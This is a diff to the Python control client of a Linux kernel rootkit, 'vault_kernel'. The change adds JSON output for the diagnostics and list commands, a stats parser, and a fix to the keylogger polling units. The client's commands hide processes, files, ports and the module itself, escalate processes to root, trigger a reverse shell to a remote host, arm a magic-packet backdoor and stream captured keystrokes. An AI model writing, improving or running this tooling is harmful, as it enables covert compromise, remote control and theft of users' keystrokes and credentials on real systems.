@@ -13,7 +13,7 @@ Commands:
     unhide-pid <pid>      Reveal a hidden process
     hide-port <port>      Hide a TCP/UDP port from netstat, ss
     unhide-port <port>    Reveal a hidden port
-    list                  List all hidden items (PIDs, files, ports)
+    list [--json]         List all hidden items (PIDs, files, ports)
     give-root [pid]       Escalate a process to root (default: self)
     shell <ip:port>       Trigger reverse shell to remote host
     magic <word>          Set magic packet trigger word
@@ -24,7 +24,7 @@ Commands:
     unhide-module         Make rootkit visible in lsmod
     reset                 Clear ALL hidden files, PIDs and ports
     status                Check if rootkit is loaded and show info
-    doctor                Diagnose module/client state (lab sanity check)
+    doctor [--json]       Diagnose module/client state (lab sanity check)
 """
 
 import os
@@ -40,7 +40,7 @@ import argparse
 MAGIC = 0xC0
 DEVICE_PATH = "/dev/vault_kernel"
 SYSFS_MODULE = "/sys/module/vault_kernel"
-CLIENT_VERSION = "3.5"
+CLIENT_VERSION = "3.6"
 
 
 def _port_arg(value):
@@ -91,6 +91,19 @@ IOCTL_RESET_ALL       = _IO(MAGIC, 0x10)
 
 MAGIC_SIGNAL = 35  # glibc SIGRTMIN(34) + 1 — matches MAGIC_SIGNAL in src/backdoor.c
 
+# keylog --follow polling (documented in MILLISECONDS, parity with the
+# Go client's default 500 / min 50).
+KEYLOG_DEFAULT_INTERVAL_MS = 500
+KEYLOG_MIN_INTERVAL_MS = 50
+
+
+def _interval_ms_to_seconds(ms):
+    """Convert a documented-MILLISECONDS --interval into the seconds
+    time.sleep() expects, clamped to the 50 ms floor.  v3.5 slept the
+    raw value as SECONDS ("--interval 500" = 8 minutes per poll,
+    1000x slower than the Go client and the documented units)."""
+    return max(ms, KEYLOG_MIN_INTERVAL_MS) / 1000.0
+
 
 def fnv1a16(word: str) -> int:
     """FNV-1a 32-bit folded to 16 bits — mirrors vault_fnv1a16() in src/backdoor.c."""
@@ -104,6 +117,61 @@ def fnv1a16(word: str) -> int:
 def magic_pid(word: str, port: int) -> int:
     """Encode (port, word) into the fake PID for the kill() backdoor trigger."""
     return (port << 16) | fnv1a16(word)
+
+
+def parse_stats_report(report: str) -> dict:
+    """Token-based parser for the GET_STATS key=value report.
+
+    The module puts MULTIPLE pairs on one line ("module=vault_kernel
+    version=3.5"), so parsing must split on whitespace first; the old
+    line-based partition('=') swallowed every pair after the first
+    (v3.4/v3.5 bug in `stats --json` and in the `doctor` version
+    check). Mirrors ParseStatsReport in the Go client.
+    """
+    out = {}
+    for line in report.splitlines():
+        for tok in line.split():
+            key, sep, value = tok.partition("=")
+            if key and sep:
+                out[key] = value
+    return out
+
+
+def parse_hidden_list(report: str) -> dict:
+    """Parse the LIST_HIDDEN report into {"pids": [...], "files":
+    [...], "ports": [...]}.  Section context decides how each entry is
+    interpreted, so a file literally named "pid: 5" stays a file name.
+    Mirrors ParseHiddenList in the Go client.
+    """
+    result = {"pids": [], "files": [], "ports": []}
+    section = None
+    for line in report.splitlines():
+        stripped = line.strip()
+        if stripped.startswith("---"):
+            if "PIDs" in stripped:
+                section = "pids"
+            elif "Files" in stripped:
+                section = "files"
+            elif "Ports" in stripped:
+                section = "ports"
+            else:
+                section = None
+            continue
+        if not stripped or section is None:
+            continue
+        if section == "pids" and stripped.startswith("pid:"):
+            try:
+                result["pids"].append(int(stripped[4:].strip()))
+            except ValueError:
+                pass
+        elif section == "ports" and stripped.startswith("port:"):
+            try:
+                result["ports"].append(int(stripped[5:].strip()))
+            except ValueError:
+                pass
+        elif section == "files":
+            result["files"].append(stripped)
+    return result
 
 
 def _proc_euid(pid):
@@ -127,34 +195,51 @@ def _reject(condition, message):
         raise SystemExit(f"[-] {message}")
 
 
-def run_doctor():
+def run_doctor(as_json=False):
     """Lab sanity checks: device node, permissions, stats ABI, hook
     count, client/module version match, stealth state and every
     read-only control interface. Exits non-zero only when the module
-    is unreachable; warnings do not fail."""
-    print("[*] vault_kernel doctor — lab diagnostics")
-    print()
-    warnings = 0
+    is unreachable; warnings do not fail. With as_json=True prints a
+    single JSON document instead of text."""
+    rep = {"client_version": CLIENT_VERSION, "warnings": 0}
+
+    def say(fmt, *a):
+        if not as_json:
+            print(fmt % a)
+
+    def fail(code):
+        if as_json:
+            print(json.dumps(rep, indent=2))
+        raise SystemExit(code)
+
+    say("[*] vault_kernel doctor — lab diagnostics")
+    say("")
 
     try:
         st = os.stat(DEVICE_PATH)
     except OSError:
-        print(f"  [FAIL] {DEVICE_PATH} not found — module is not loaded")
-        print("         Load it first: sudo insmod vault_kernel.ko")
-        raise SystemExit(1)
-    print(f"  [ OK ] device {DEVICE_PATH} present "
-          f"(mode {stat_mod.filemode(st.st_mode)})")
+        rep["device_present"] = False
+        say("  [FAIL] %s not found — module is not loaded", DEVICE_PATH)
+        say("         Load it first: sudo insmod vault_kernel.ko")
+        fail(1)
+        return
+    rep["device_present"] = True
+    say("  [ OK ] device %s present (mode %s)", DEVICE_PATH,
+        stat_mod.filemode(st.st_mode))
 
     try:
         fd = os.open(DEVICE_PATH, os.O_RDWR)
     except OSError as e:
-        print(f"  [FAIL] cannot open {DEVICE_PATH}: {e}")
-        print("         EACCES/EPERM → run with sudo "
-              "(module also rejects non-root since v3.4).")
-        raise SystemExit(1)
+        rep["device_open"] = False
+        say("  [FAIL] cannot open %s: %s", DEVICE_PATH, e)
+        say("         EACCES/EPERM → run with sudo "
+            "(module also rejects non-root since v3.4).")
+        fail(1)
+        return
+    rep["device_open"] = True
 
     try:
-        print("  [ OK ] device opens read/write")
+        say("  [ OK ] device opens read/write")
 
         def raw(request, buf):
             try:
@@ -166,57 +251,85 @@ def run_doctor():
         buf = bytearray(4096)
         e = raw(IOCTL_GET_STATS, buf)
         if e is not None:
-            print(f"  [FAIL] GET_STATS failed: {e}")
+            rep["stats_responds"] = False
+            say("  [FAIL] GET_STATS failed: %s", e)
             if e.errno == errno.ENOTTY:
-                print("         ENOTTY → client and module versions are out of sync.")
-            raise SystemExit(1)
-        stats = {}
-        for line in buf.rstrip(b'\x00').decode(errors='replace').splitlines():
-            line = line.strip()
-            if '=' in line:
-                key, _, value = line.partition('=')
-                stats[key] = value
-        print("  [ OK ] GET_STATS responds")
-        print(f"         module version : {stats.get('version')}")
-        print(f"         uptime_s       : {stats.get('uptime_s')}")
+                say("         ENOTTY → client and module versions are out of sync.")
+            fail(1)
+            return
+        rep["stats_responds"] = True
+        # The stats report carries MULTIPLE key=value pairs per line —
+        # parse it with the shared token-based parser (see
+        # parse_stats_report for the v3.4/v3.5 bug this replaces).
+        stats = parse_stats_report(buf.rstrip(b'\x00').decode(errors='replace'))
+        say("  [ OK ] GET_STATS responds")
+        say("         module version : %s", stats.get("version"))
+        say("         uptime_s       : %s", stats.get("uptime_s"))
+        rep["module_version"] = stats.get("version", "")
+        if rep["module_version"] == "":
+            del rep["module_version"]
+        try:
+            rep["uptime_s"] = int(stats["uptime_s"])
+        except (KeyError, ValueError):
+            pass
 
-        if stats.get('version') and stats['version'] != CLIENT_VERSION:
-            print(f"  [WARN] client v{CLIENT_VERSION} != module v{stats['version']} "
-                  "— ioctl ABI may differ")
-            warnings += 1
+        if stats.get("version"):
+            rep["version_match"] = stats["version"] == CLIENT_VERSION
+            if not rep["version_match"]:
+                say("  [WARN] client v%s != module v%s "
+                    "— ioctl ABI may differ", CLIENT_VERSION, stats["version"])
+                rep["warnings"] += 1
 
-        hooks = stats.get('hooks_installed')
+        hooks = stats.get("hooks_installed")
         if hooks is not None:
-            if hooks == '0':
-                print("  [WARN] 0 syscall hooks installed — hiding features are inactive")
-                warnings += 1
+            try:
+                n = int(hooks)
+            except ValueError:
+                say("  [WARN] hooks_installed not numeric: %r", hooks)
+                rep["warnings"] += 1
             else:
-                print(f"  [ OK ] {hooks}/{stats.get('hooks_planned')} syscall hooks installed")
+                rep["hooks_installed"] = n
+                try:
+                    p = int(stats["hooks_planned"])
+                    rep["hooks_planned"] = p
+                    say("  [ OK ] %d/%d syscall hooks installed", n, p)
+                except (KeyError, ValueError):
+                    say("  [ OK ] %d syscall hooks installed", n)
+                if n == 0:
+                    say("  [WARN] 0 syscall hooks installed — "
+                        "hiding features are inactive")
+                    rep["warnings"] += 1
 
-        if not os.path.isdir(SYSFS_MODULE):
-            print("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")
+        rep["module_in_sysfs"] = os.path.isdir(SYSFS_MODULE)
+        if rep["module_in_sysfs"]:
+            say("  [INFO] module visible in /sys/module — not hidden")
         else:
-            print("  [INFO] module visible in /sys/module — not hidden")
+            say("  [INFO] module not in /sys/module — hidden from lsmod/sysfs")
 
         e = raw(IOCTL_KEYLOG_READ, bytearray(4096))
+        rep["keylog_responds"] = e is None
         if e is not None:
-            print(f"  [WARN] KEYLOG_READ failed: {e}")
-            warnings += 1
+            say("  [WARN] KEYLOG_READ failed: %s", e)
+            rep["warnings"] += 1
         else:
-            print("  [ OK ] keylog interface responds")
+            say("  [ OK ] keylog interface responds")
 
         e = raw(IOCTL_LIST_HIDDEN, bytearray(4096))
+        rep["list_responds"] = e is None
         if e is not None:
-            print(f"  [WARN] LIST_HIDDEN failed: {e}")
-            warnings += 1
+            say("  [WARN] LIST_HIDDEN failed: %s", e)
+            rep["warnings"] += 1
         else:
-            print("  [ OK ] list interface responds")
+            say("  [ OK ] list interface responds")
 
-        print()
-        if warnings:
-            print(f"[*] doctor finished with {warnings} warning(s)")
+        if as_json:
+            print(json.dumps(rep, indent=2))
         else:
-            print("[*] doctor finished: everything OK")
+            print()
+            if rep["warnings"]:
+                print(f"[*] doctor finished with {rep['warnings']} warning(s)")
+            else:
+                print("[*] doctor finished: everything OK")
     finally:
         os.close(fd)
 
@@ -328,12 +441,15 @@ class VaultKernelClient:
             print(f"[-] Revealed port: {port}")
         self._close()
 
-    def list_hidden(self):
+    def list_hidden(self, as_json=False):
         self._open()
         buf = bytearray(4096)
         if self._ioctl(IOCTL_LIST_HIDDEN, buf):
             output = buf.rstrip(b'\x00').decode(errors='replace')
-            print(output if output else "(nothing hidden)")
+            if as_json:
+                print(json.dumps(parse_hidden_list(output), indent=2))
+            else:
+                print(output if output else "(nothing hidden)")
         self._close()
 
     def shell(self, target):
@@ -359,11 +475,14 @@ class VaultKernelClient:
             print(f"[+] Magic packet backdoor enabled: '{word}'")
         self._close()
 
-    def keylog_read(self, follow=False, interval=0.5):
+    def keylog_read(self, follow=False, interval=None):
         """Read captured keystrokes; with follow=True, stream new
         keystrokes until Ctrl-C.  The module's buffer shifts left when
         full, so a suffix diff is printed while the common prefix
-        holds and a full replay when it wraps."""
+        holds and a full replay when it wraps.  `interval` is in
+        SECONDS internally (None = documented default of 500 ms)."""
+        if interval is None:
+            interval = _interval_ms_to_seconds(KEYLOG_DEFAULT_INTERVAL_MS)
         self._open()
         prev = ""
         try:
@@ -448,12 +567,9 @@ class VaultKernelClient:
             if not output:
                 print("(no stats returned)")
             elif as_json:
-                raw = {}
-                for line in output.splitlines():
-                    line = line.strip()
-                    if '=' in line:
-                        key, _, value = line.partition('=')
-                        raw[key] = value
+                raw = parse_stats_report(output)
+                if not raw:
+                    raise SystemExit("[-] module returned an empty stats report")
                 out = {}
                 for key, value in raw.items():
                     try:
@@ -483,7 +599,9 @@ def main():
     subparsers = parser.add_subparsers(dest="command", help="Available commands")
 
     subparsers.add_parser("status", help="Check if rootkit is loaded")
-    subparsers.add_parser("doctor", help="Diagnose module/client state (lab sanity check)")
+    sp = subparsers.add_parser("doctor", help="Diagnose module/client state (lab sanity check)")
+    sp.add_argument("--json", action="store_true", dest="as_json",
+                    help="emit diagnostics as machine-readable JSON")
 
     sp = subparsers.add_parser("give-root", help="Escalate process to root")
     sp.add_argument("pid", nargs="?", type=int, default=0,
@@ -507,7 +625,9 @@ def main():
     sp = subparsers.add_parser("unhide-port", help="Reveal a hidden port")
     sp.add_argument("port", type=_port_arg, help="Port number (1-65535)")
 
-    subparsers.add_parser("list", help="List all hidden items")
+    sp = subparsers.add_parser("list", help="List all hidden items")
+    sp.add_argument("--json", action="store_true", dest="as_json",
+                    help="emit the hidden list as machine-readable JSON")
     sp = subparsers.add_parser("stats", help="Show module stats")
     sp.add_argument("--json", action="store_true", dest="as_json",
                     help="emit stats as machine-readable JSON")
@@ -525,7 +645,8 @@ def main():
     sp = subparsers.add_parser("keylog", help="Read captured keystrokes")
     sp.add_argument("--follow", action="store_true",
                     help="stream new keystrokes until Ctrl-C")
-    sp.add_argument("--interval", type=float, default=0.5, metavar="MS",
+    sp.add_argument("--interval", type=float,
+                    default=KEYLOG_DEFAULT_INTERVAL_MS, metavar="MS",
                     help="poll interval in ms for --follow (default 500, min 50)")
     subparsers.add_parser("keylog-clear", help="Clear keylogger buffer")
     subparsers.add_parser("hide-module", help="Hide from lsmod")
@@ -547,7 +668,7 @@ def main():
         if args.command == "status":
             client.status()
         elif args.command == "doctor":
-            run_doctor()
+            run_doctor(as_json=args.as_json)
         elif args.command == "give-root":
             client.give_root(args.pid)
         elif args.command == "hide-file":
@@ -563,7 +684,7 @@ def main():
         elif args.command == "unhide-port":
             client.unhide_port(args.port)
         elif args.command == "list":
-            client.list_hidden()
+            client.list_hidden(as_json=args.as_json)
         elif args.command == "stats":
             client.stats(as_json=args.as_json)
         elif args.command == "shell":
@@ -573,7 +694,9 @@ def main():
         elif args.command == "magic-encode":
             client.magic_encode(args.word, args.port)
         elif args.command == "keylog":
-            interval = max(args.interval, 0.05)
+            # --interval is documented in ms (like the Go client);
+            # _interval_ms_to_seconds clamps to the 50 ms floor.
+            interval = _interval_ms_to_seconds(args.interval)
             client.keylog_read(follow=args.follow, interval=interval)
         elif args.command == "keylog-clear":
             client.keylog_clear()
